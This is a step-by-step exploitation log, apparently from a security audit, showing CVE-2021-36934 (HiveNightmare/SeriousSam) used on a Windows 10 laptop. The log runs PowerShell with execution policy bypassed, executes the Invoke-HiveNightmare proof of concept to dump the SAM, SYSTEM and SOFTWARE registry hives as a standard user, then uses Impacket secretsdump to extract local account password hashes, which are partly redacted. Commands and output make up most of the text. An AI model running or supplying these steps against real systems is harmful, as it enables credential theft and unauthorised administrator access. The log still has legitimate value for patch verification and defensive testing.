======================================================================================================================================
Windows local privilege escalation - SeriousSam / HiveNightmare exploit (CVE-2021-36934)
======================================================================================================================================


======================================================================================================================================
1. Test of the SeriousSam / HiveNightmare local privilege escalation vulnerability using the PowerShell script 'Invoke-HiveNightmare' 
======================================================================================================================================

Link: https://github.com/WiredPulse/Invoke-HiveNightmare
      PowerShell-based PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, SYSTEM, and SOFTWARE Registry hives in Windows 10 version 1809 or newer.


Step 1 - Start a CMD shell as a low-privileged user
====================================================

Microsoft Windows [Version 10.0.19042.1110]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
Win-Laptop-Test\auditor

C:\WINDOWS\system32> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
Guest
jeff
The command completed successfully.

PS C:\Users\Public\Privesc-HiveNightmare> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
Win-Laptop-Test\auditor S-1-5-21-936125016-2310263949-2175806047-1013


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

ERROR: Unable to get user claims information.


Step 2 - Start powershell and execute the script 'Invoke-HiveNightmare.ps1' to dump the registry hives "SAM", "SYSTEM" and "SOFTWARE" 
=================================================================================================================================================

C:\WINDOWS\system32>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Public\Privesc-HiveNightmare> .\Invoke-HiveNightmare.ps1 "C:\Users\Public\Privesc-HiveNightmare\"

[+] System is a vulnerable version of Windows
[+] Dumping SAM1 hive...
[+] Dumping SOFTWARE1 hive...
[+] Dumping SYSTEM1 hive...
[+] Dumping SAM2 hive...
[+] Dumping SOFTWARE2 hive...
[+] Dumping SYSTEM2 hive...
[+] Dumping SAM3 hive...
[+] Dumping SOFTWARE3 hive...
[+] Dumping SYSTEM3 hive...
[+] Hives are dumped to C:\Users\Public\Privesc-HiveNightmare\

PS C:\Users\Public\Privesc-HiveNightmare>

=> The exploit worked ! Now let's extract the password hash of the local administrator account to complete the privesc :-)

C:\Users\Public\Privesc-HiveNightmare>secretsdump.exe -sam Sam.hive1 -system Sys.hive1 LOCAL
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Target system bootKey: 0xafec958786f8362bf3f<SNIP>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36f7a3<SNIP>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae9<SNIP>
<SNIP>

